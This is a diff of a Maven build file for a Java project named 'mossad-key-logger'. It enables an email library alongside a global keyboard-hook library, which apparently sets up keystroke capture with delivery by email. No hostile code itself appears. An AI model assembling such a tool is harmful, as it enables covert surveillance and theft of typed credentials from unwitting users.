@@ -11,18 +11,18 @@
     <artifactId>mossad-key-logger</artifactId>
 
     <dependencies>
-        <dependency>
-            <groupId>com.1stleg</groupId>
-            <artifactId>jnativehook</artifactId>
-        </dependency>
-		<!--
+
         <dependency>
             <groupId>org.apache.commons</groupId>
             <artifactId>commons-email</artifactId>
             <version>1.5</version>
         </dependency>
-        -->
-		
+        <dependency>
+            <groupId>com.1stleg</groupId>
+            <artifactId>jnativehook</artifactId>
+        </dependency>
+
+
     </dependencies>
 
     <build>
